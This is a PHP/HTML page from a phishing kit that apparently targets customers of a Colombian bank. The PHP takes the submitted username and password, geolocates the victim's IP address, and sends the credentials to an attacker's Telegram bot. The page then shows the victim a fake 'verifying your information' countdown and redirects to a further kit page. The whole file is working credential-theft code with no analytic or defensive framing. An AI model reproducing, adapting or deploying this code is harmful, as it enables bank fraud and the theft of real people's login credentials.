<?php
   ini_set("display_errors", 0);
   include "aquiva.php";
   
   
   if (isset($_POST['SUAVECITO']) && isset($_POST['VAIPAESA'])  ) {
       $breve = $_POST['SUAVECITO'];
       $breve2 = $_POST['VAIPAESA'];
       $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
       $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
       $mensajito .= "B4NC0LS\nUC3R: ".$_POST['SUAVECITO']."\nCL4V: ".$_POST['VAIPAESA']."\nYYP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";
   
       env($tribales, $tulum, $mensajito);
   }
   function getIpInfo($ip) {
       $url = "http://ipinfo.io/{$ip}/json";  
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($curl);
       curl_close($curl);
       
       return json_decode($response, true);
   }
   function env($dakota, $chatsito, $mensajillo) {
       $url = "https://api.telegram.org/bot{$dakota}/sendMessage";
       $data = array(
           'chat_id' => $chatsito,
           'text' => $mensajillo
       );
   
       $options = array(
           CURLOPT_URL => $url,
           CURLOPT_POST => true,
           CURLOPT_POSTFIELDS => http_build_query($data),
           CURLOPT_RETURNTRANSFER => true,
       );
   
       $curl = curl_init();
       curl_setopt_array($curl, $options);
       $response = curl_exec($curl);
       curl_close($curl);
   
       return $response;
       
   }
   
   ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Espere Colombia</title>
    <link rel="stylesheet" href="styles.css">
    <script language="JavaScript">
    
      var totalTiempo = 20;
      var url = "muas2.php";

      function updateReloj() {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera " + totalTiempo + " segundos, estamos verificando su información";
        if (totalTiempo == 0) {
          window.location = url;
        } else {
         
          totalTiempo -= 1;
          
          setTimeout("updateReloj()", 1200);
        }
      }
      window.onload = updateReloj;
    </script>
</head>
<body style="background-image: url(fondito.svg);background-size: cover;background-repeat: no-repeat;background-position: bottom -307px left -288px;">
    <br>
   <img src="logo.svg" style="width: 250px;display: block;margin: 0 auto;">
   <br>
   <br>

    <form class="formulario">
        <h1 style="display: block;margin: 0 auto;text-align: center;font-size: 20pt;">Cargando...</h1>
        <br>
        <img src="redondo.gif" style="width:120px;display: block;margin: 0 auto;">
        <br>
         <p id='CuentaAtras' style="display: block;margin: 0 auto;text-align: center;font-family: Helvetica;"></p>
       
      <br>
        
        <br>
        <br>
        
        <br>
        <br>
        <br>
       
        
    </form>
</body>
</html>